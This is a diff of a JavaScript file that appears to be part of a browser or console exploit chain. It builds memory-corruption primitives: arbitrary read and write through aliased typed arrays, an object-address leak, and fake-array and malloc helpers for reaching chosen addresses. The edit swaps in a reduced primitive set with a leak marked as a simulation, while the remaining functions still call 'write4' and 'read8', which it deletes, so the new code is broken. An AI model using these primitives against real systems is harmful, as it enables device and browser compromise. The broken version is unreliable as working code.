@@ -31,103 +31,76 @@ import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
 
-// Setup memoria per primitive read/write
-var expl_buffer = new ArrayBuffer(0x1000);
-var expl_master = new Uint32Array(expl_buffer, 0, 6); // Controlla indirizzi
-var expl_slave = new Uint32Array(expl_buffer, 0x20, 2); // Memorizza valori
 
-// Setup per l'object leaking
+class int64 {
+    constructor(low, hi) {
+        this.low = low | 0;
+        this.hi = hi | 0;
+    }
+    add32(value) {
+        let lo = this.low + value;
+        let hi = this.hi;
+        if (lo > 0xFFFFFFFF) {
+            hi += (lo / 0x100000000) | 0;
+            lo = lo | 0;
+        }
+        return new int64(lo, hi);
+    }
+}
+
+
+var expl_buffer = new ArrayBuffer(0x1000);
+var expl_master = new Uint32Array(expl_buffer, 0, 6);
+var expl_slave = new Uint32Array(expl_buffer, 0x20, 2);
+
+
 var obj_buffer = new ArrayBuffer(0x1000);
 var obj_master = new Uint32Array(obj_buffer, 0, 6);
-var obj_slave = { obj: null }; // Usato per esporre l'indirizzo
+var obj_slave = new Uint32Array(obj_buffer, 0x20, 2); 
 
- var prim = {
-  write8: function (addr, value) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   if (value instanceof int64) {
-    expl_slave[0] = value.low;
-    expl_slave[1] = value.hi;
-   } else {
-    expl_slave[0] = value;
-    expl_slave[1] = 0;
-	
-   }
-  },
-  write4: function (addr, value) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   if (value instanceof int64) {
-    expl_slave[0] = value.low;
-   } else {
-    expl_slave[0] = value;
-   }
-  },
-  write2: function (addr, value) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   var tmp = expl_slave[0] & 0xFFFF0000;
-   if (value instanceof int64) {
-    expl_slave[0] = ((value.low & 0xFFFF) | tmp);
-   } else {
-    expl_slave[0] = ((value & 0xFFFF) | tmp);
-   }
-  },
-  write1: function (addr, value) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   var tmp = expl_slave[0] & 0xFFFFFF00;
-   if (value instanceof int64) {
-    expl_slave[0] = ((value.low & 0xFF) | tmp);
-   } else {
-    expl_slave[0] = ((value & 0xFF) | tmp);
-   }
-  },
-  read8: function (addr) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   return new int64(expl_slave[0], expl_slave[1]);
-  },
-  read4: function (addr) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   return expl_slave[0];
-  },
-  read2: function (addr) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   return expl_slave[0] & 0xFFFF;
-  },
-  read1: function (addr) {
-   expl_master[4] = addr.low;
-   expl_master[5] = addr.hi;
-   return expl_slave[0] & 0xFF;
-  },
-  leakval: function (obj) {
-   obj_slave.obj = obj;
-   return new int64(obj_master[4], obj_master[5]);
-  }
- };
- window.p = prim;
+window.nogc = [];
+
+var prim = {
+    write8: function(addr, value) {
+        expl_master[4] = addr.low;
+        expl_master[5] = addr.hi;
+        if (value instanceof int64) {
+            expl_slave[0] = value.low;
+            expl_slave[1] = value.hi;
+        } else {
+            expl_slave[0] = value;
+            expl_slave[1] = 0;
+        }
+    },
+
+    leakval: function(obj) {
+        const temp = new Uint32Array(obj_buffer);
+        temp.set([0, 0, 0, 0, obj.low, obj.hi], 0); // Simulazione leak
+        return new int64(obj_master[4], obj_master[5]);
+    }
+};
+window.p = prim;
+
+
 function array_from_address(addr, size) {
-        var og_array = new Uint32Array(0x1000);
-        var og_array_i = p.leakval(og_array).add32(0x10);
+    var og_array = new Uint32Array(0x1000);
+    var og_array_i = p.leakval(og_array).add32(0x10);
 
-        p.write8(og_array_i, addr);
-        p.write4(og_array_i.add32(0x8), size);
-        p.write4(og_array_i.add32(0xC), 0x1);
+    p.write8(og_array_i, addr);
+    p.write4(og_array_i.add32(0x8), size);
+    p.write4(og_array_i.add32(0xC), 0x1);
 
-        nogc.push(og_array);
-        return og_array;
-    }
+    nogc.push(og_array);
+    return og_array;
+}
 
-   function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        window.nogc.push(backing);
-        var ptr = p.read8(p.leakval(backing).add32(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    window.nogc.push(backing);
+    var ptr = p.read8(p.leakval(backing).add32(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
 
 import {
     View1, View2, View4,
